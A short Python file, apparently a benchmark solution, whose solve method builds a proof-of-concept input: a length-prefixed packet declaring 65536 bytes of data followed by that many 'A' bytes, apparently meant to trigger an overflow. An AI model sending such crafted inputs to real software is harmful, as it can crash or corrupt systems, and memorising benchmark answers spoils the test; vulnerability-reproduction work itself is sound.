import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        data_length = 65536
        packet_data = struct.pack('<B', 11) + struct.pack('<I', 0) + struct.pack('<B', 1) + struct.pack('<I', data_length)
        packet_data += b'A' * data_length
        length = len(packet_data)
        poc = struct.pack('<I', length) + packet_data
        return poc